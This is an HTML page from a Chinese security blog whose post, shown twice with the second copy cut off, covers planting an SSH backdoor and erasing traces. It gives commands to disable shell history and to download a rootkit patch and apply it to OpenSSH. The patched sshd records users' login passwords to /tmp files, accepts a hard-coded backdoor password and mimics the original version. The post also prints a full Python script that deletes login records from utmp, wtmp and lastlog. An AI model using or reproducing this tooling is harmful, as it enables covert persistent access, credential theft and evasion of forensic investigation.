@@ -1,0 +1,689 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Page 19 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>😊#<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		wubba lubba dub dub.
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2016/04/13/clear-ssh-history.html" >SSH后门和清除痕迹</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-04-13  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>对于SSH来说，登录主机之后先执行：<br><code>unset HISTFILE;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace </code></p>
+<p>然后是SSH留后门的方法<a target="_blank" rel="noopener" href="http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108">http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108</a>简单来说就是以下的代码：</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum <span class="token function">install</span> -y openssl openssl-devel pam-devel
+http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
+http://ftp.vim.org/security/OpenSSH/openssh-5.9p1.tar.gz
+<span class="token function">tar</span> zxvf openssh-5.9p1.tar.gz   
+<span class="token function">tar</span> zxvf 0x06-openssh-5.9p1.patch.tar.gz   
+<span class="token builtin class-name">cd</span> openssh-5.9p1.patch/   
+<span class="token function">cp</span> sshbd5.9p1.diff <span class="token punctuation">..</span>/openssh-5.9p1   
+<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/openssh-5.9p1   
+patch <span class="token operator">&lt;</span> sshbd5.9p1.diff   //patch  后门
+执行vi includes.h
+
++<span class="token comment">#define ILOG "/tmp/ilog" //记录登录到本机的用户名和密码</span>
++<span class="token comment">#define OLOG "/tmp/olog" //记录本机登录到远程的用户名和密码</span>
++<span class="token comment">#define SECRETPW "123456654321" //你后门的密码</span>
+
+执行vi version.h
+
+<span class="token comment">#define SSH_VERSION "填入之前记下来的版本号,伪装原版本"</span>
+<span class="token comment">#define SSH_PORTABLE "小版本号"</span>
+./configure --prefix<span class="token operator">=</span>/usr --sysconfdir<span class="token operator">=</span>/etc/ssh --with-pam --with-kerberos5
+<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span> 
+<span class="token function">service</span> sshd restart //重启sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a target="_blank" rel="noopener" href="http://blog.csdn.net/bnxf00000/article/details/45217831">http://blog.csdn.net/bnxf00000/article/details/45217831</a></p>
+<p>接下来删除登录的历史记录，使用<a target="_blank" rel="noopener" href="http://0cx.cc/python_logtamper.jspx">logtamper.py</a>代码复制过来：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python </span>
+<span class="token keyword">import</span> os<span class="token punctuation">,</span> struct<span class="token punctuation">,</span> sys
+<span class="token keyword">from</span> pwd <span class="token keyword">import</span> getpwnam
+<span class="token keyword">from</span> time <span class="token keyword">import</span> strptime<span class="token punctuation">,</span> mktime
+<span class="token keyword">from</span> optparse <span class="token keyword">import</span> OptionParser
+ 
+UTMPFILE <span class="token operator">=</span> <span class="token string">"/var/run/utmp"</span>
+WTMPFILE <span class="token operator">=</span> <span class="token string">"/var/log/wtmp"</span>
+LASTLOGFILE <span class="token operator">=</span> <span class="token string">"/var/log/lastlog"</span>
+ 
+LAST_STRUCT <span class="token operator">=</span> <span class="token string">'I32s256s'</span>
+LAST_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>LAST_STRUCT<span class="token punctuation">)</span>
+ 
+XTMP_STRUCT <span class="token operator">=</span> <span class="token string">'hi32s4s32s256shhiii4i20x'</span>
+XTMP_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>XTMP_STRUCT<span class="token punctuation">)</span>
+ 
+ 
+<span class="token keyword">def</span> <span class="token function">getXtmp</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> username<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    xtmp <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
+        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+            <span class="token builtin">bytes</span> <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span>XTMP_STRUCT_SIZE<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
+                <span class="token keyword">break</span>
+ 
+            data <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span>XTMP_STRUCT<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span>
+            record <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">]</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> username <span class="token keyword">and</span> record<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">continue</span>
+            xtmp <span class="token operator">+=</span> <span class="token builtin">bytes</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        showMessage<span class="token punctuation">(</span><span class="token string">'Cannot open file: %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">)</span>
+    <span class="token keyword">finally</span><span class="token punctuation">:</span>
+        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> xtmp
+ 
+ 
+<span class="token keyword">def</span> <span class="token function">modifyLast</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> username<span class="token punctuation">,</span> hostname<span class="token punctuation">,</span> ttyname<span class="token punctuation">,</span> strtime<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        p <span class="token operator">=</span> getpwnam<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        showMessage<span class="token punctuation">(</span><span class="token string">'No such user.'</span><span class="token punctuation">)</span>
+ 
+    timestamp <span class="token operator">=</span> <span class="token number">0</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        str2time <span class="token operator">=</span> strptime<span class="token punctuation">(</span>strtime<span class="token punctuation">,</span> <span class="token string">'%Y:%m:%d:%H:%M:%S'</span><span class="token punctuation">)</span>
+        timestamp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>mktime<span class="token punctuation">(</span>str2time<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        showMessage<span class="token punctuation">(</span><span class="token string">'Time format err.'</span><span class="token punctuation">)</span>
+ 
+    data <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>LAST_STRUCT<span class="token punctuation">,</span> timestamp<span class="token punctuation">,</span> ttyname<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span>
+        fp<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>LAST_STRUCT_SIZE <span class="token operator">*</span> p<span class="token punctuation">.</span>pw_uid<span class="token punctuation">)</span>
+        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        showMessage<span class="token punctuation">(</span><span class="token string">'Cannot open file: %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">)</span>
+    <span class="token keyword">finally</span><span class="token punctuation">:</span>
+        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token boolean">True</span>
+ 
+ 
+<span class="token keyword">def</span> <span class="token function">showMessage</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span> msg
+    exit<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+ 
+ 
+<span class="token keyword">def</span> <span class="token function">saveFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> contents<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'w+b'</span><span class="token punctuation">)</span>
+        fp<span class="token punctuation">.</span>write<span class="token punctuation">(</span>contents<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        showMessage<span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+    <span class="token keyword">finally</span><span class="token punctuation">:</span>
+        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ 
+ 
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    usage <span class="token operator">=</span> 'usage<span class="token punctuation">:</span> logtamper<span class="token punctuation">.</span>py <span class="token operator">-</span>m <span class="token number">2</span> <span class="token operator">-</span>u b4dboy <span class="token operator">-</span>i <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.188</span>\n \
+        logtamper<span class="token punctuation">.</span>py <span class="token operator">-</span>m <span class="token number">3</span> <span class="token operator">-</span>u b4dboy <span class="token operator">-</span>i <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.188</span> <span class="token operator">-</span>t tty1 <span class="token operator">-</span>d <span class="token number">2015</span><span class="token punctuation">:</span><span class="token number">05</span><span class="token punctuation">:</span><span class="token number">28</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">:</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token number">12</span>'
+    parser <span class="token operator">=</span> OptionParser<span class="token punctuation">(</span>usage<span class="token operator">=</span>usage<span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-m'</span><span class="token punctuation">,</span> <span class="token string">'--mode'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'MODE'</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">'1'</span> <span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">'1: utmp, 2: wtmp, 3: lastlog [default: 1]'</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-t'</span><span class="token punctuation">,</span> <span class="token string">'--ttyname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'TTYNAME'</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-f'</span><span class="token punctuation">,</span> <span class="token string">'--filename'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'FILENAME'</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-u'</span><span class="token punctuation">,</span> <span class="token string">'--username'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'USERNAME'</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-i'</span><span class="token punctuation">,</span> <span class="token string">'--hostname'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'HOSTNAME'</span><span class="token punctuation">)</span>
+    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'--dateline'</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">'DATELINE'</span><span class="token punctuation">)</span>
+    <span class="token punctuation">(</span>options<span class="token punctuation">,</span> args<span class="token punctuation">)</span> <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
+ 
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
+ 
+            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> UTMPFILE
+ 
+            <span class="token comment"># tamper</span>
+            newData <span class="token operator">=</span> getXtmp<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">)</span>
+            saveFile<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> newData<span class="token punctuation">)</span>
+ 
+        <span class="token keyword">elif</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'2'</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
+ 
+            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> WTMPFILE
+ 
+            <span class="token comment"># tamper</span>
+            newData <span class="token operator">=</span> getXtmp<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">)</span>
+            saveFile<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> newData<span class="token punctuation">)</span>
+ 
+        <span class="token keyword">elif</span> options<span class="token punctuation">.</span>MODE <span class="token operator">==</span> <span class="token string">'3'</span><span class="token punctuation">:</span>
+            <span class="token keyword">if</span> options<span class="token punctuation">.</span>USERNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>HOSTNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>TTYNAME <span class="token operator">==</span> <span class="token boolean">None</span> <span class="token keyword">or</span> options<span class="token punctuation">.</span>DATELINE <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                showMessage<span class="token punctuation">(</span><span class="token string">'+[Warning]: Incorrect parameter.\n'</span><span class="token punctuation">)</span>
+ 
+            <span class="token keyword">if</span> options<span class="token punctuation">.</span>FILENAME <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
+                options<span class="token punctuation">.</span>FILENAME <span class="token operator">=</span> LASTLOGFILE
+ 
+            <span class="token comment"># tamper</span>
+            modifyLast<span class="token punctuation">(</span>options<span class="token punctuation">.</span>FILENAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>USERNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>HOSTNAME<span class="token punctuation">,</span> options<span class="token punctuation">.</span>TTYNAME <span class="token punctuation">,</span> options<span class="token punctuation">.</span>DATELINE<span class="token punctuation">)</span>
+ 
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            parser<span class="token punctuation">.</span>print_help<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p>====<br>更新：</p>
+<p>上面的可以在debain系使用，感觉下面这种方法更通用：<br>有两种方式:</p>
+<ol>
+<li>修改<code>/etc/ssh/ssh_config</code>或者 <code>~/.ssh/config</code> 配置文件:</li>
+</ol>
+<p>Host *</p>
+	
+
+	</div>
+  <a type="button" href="/2016/04/13/clear-ssh-history.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>对于SSH来说，登录主机之后先执行：<br><code>unset HISTFILE;export HISTFILESIZE=0;export HISTIGNORE=*;export HISTCONTROL=ignorespace </code></p>
+<p>然后是SSH留后门的方法<a target="_blank" rel="noopener" href="http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108">http://www.ricter.me/posts/%E4%BB%8E%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E7%B3%BB%E7%BB%9F%20root%20%E6%9D%83%E9%99%90?_=1460551605108</a>简单来说就是以下的代码：</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum <span class="token function">install</span> -y openssl openssl-devel pam-devel
+http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz
+http://ftp.vim.org/security/OpenSSH/openssh-5.9p1.tar.gz
+<span class="token function">tar</span> zxvf openssh-5.9p1.tar.gz   
+<span class="token function">tar</span> zxvf 0x06-openssh-5.9p1.patch.tar.gz   
+<span class="token builtin class-name">cd</span> openssh-5.9p1.patch/   
+<span class="token function">cp</span> sshbd5.9p1.diff <span class="token punctuation">..</span>/openssh-5.9p1   
+<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/openssh-5.9p1   
+patch <span class="token operator">&lt;</span> sshbd5.9p1.diff   //patch  后门
+执行vi includes.h
+
++<span class="token comment">#define ILOG "/tmp/ilog" //记录登录到本机的用户名和密码</span>
++<span class="token comment">#define OLOG "/tmp/olog" //记录本机登录到远程的用户名和密码</span>
++<span class="token comment">#define SECRETPW "123456654321" //你后门的密码</span>
+
+执行vi version.h
+
+<span class="token comment">#define SSH_VERSION "填入之前记下来的版本号,伪装原版本"</span>
+<span class="token comment">#define SSH_PORTABLE "小版本号"</span>
+./configure --prefix<span class="token operator">=</span>/usr --sysconfdir<span class="token operator">=</span>/etc/ssh --with-pam --with-kerberos5
+<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span> 
+<span class="token function">service</span> sshd restart //重启sshd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><a target="_blank" rel="noopener" href="http://blog.csdn.net/bnxf00000/article/details/45217831">http://blog.csdn.net/bnxf00000/article/details/45217831</a></p>
+<p>接下来删除登录的历史记录，使用<a target="_blank" rel="noopener" href="http://0cx.cc/python_logtamper.jspx">logtamper.py</a>代码复制过来：</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python </span>
+<span class="token keyword">import</span> os<span class="token punctuation">,</span> struct<span class="token punctuation">,</span> sys
+<span class="token keyword">from</span> pwd <span class="token keyword">import</span> getpwnam
+<span class="token keyword">from</span> time <span class="token keyword">import</span> strptime<span class="token punctuation">,</span> mktime
+<span class="token keyword">from</span> optparse <span class="token keyword">import</span> OptionParser
+ 
+UTMPFILE <span class="token operator">=</span> <span class="token string">"/var/run/utmp"</span>
+WTMPFILE <span class="token operator">=</span> <span class="token string">"/var/log/wtmp"</span>
+LASTLOGFILE <span class="token operator">=</span> <span class="token string">"/var/log/lastlog"</span>
+ 
+LAST_STRUCT <span class="token operator">=</span> <span class="token string">'I32s256s'</span>
+LAST_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>LAST_STRUCT<span class="token punctuation">)</span>
+ 
+XTMP_STRUCT <span class="token operator">=</span> <span class="token string">'hi32s4s32s256shhiii4i20x'</span>
+XTMP_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token punctuation">.</span>calcsize<span class="token punctuation">(</span>XTMP_STRUCT<span class="token punctuation">)</span>
+ 
+ 
+<span class="token keyword">def</span> <span class="token function">getXtmp</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> username<span class="token punctuation">,</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    xtmp <span class="token operator">=</span> <span class="token string">''</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        fp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span>
+        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+            <span class="token builtin">bytes</span> <span class="token operator">=</span> fp<span class="token punctuation">.</span>read<span class="token punctuation">(</span>XTMP_STRUCT_SIZE<span class="token punctuation">)</span>
+            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
+                <span class="token keyword">break</span>
+ 
+            data <span class="token operator">=</span> struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span>XTMP_STRUCT<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span>
+            record <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">]</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>record<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> username <span class="token keyword">and</span> record<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> hostname<span class="token punctuation">)</span><span class="token punctuation">:</span>
+                <span class="token keyword">continue</span>
+            xtmp <span class="token operator">+=</span> <span class="token builtin">bytes</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        showMessage<span class="token punctuation">(</span><span class="token string">'Cannot open file: %s'</span> <span class="token operator">%</span> filename<span class="token punctuation">)</span>
+    <span class="token keyword">finally</span><span class="token punctuation">:</span>
+        fp<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> xtmp
+ 
+ 
+<span class="token keyword">def</span> <span class="token function">modifyLast</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> username<span class="token punctuation">,</span> hostname<span class="token punctuation">,</span> ttyname<span class="token punctuation">,</span> strtime<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        p <span class="token operator">=</span> getpwnam<span class="token punctuation">(</span>username<span class="token punctuation">)</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
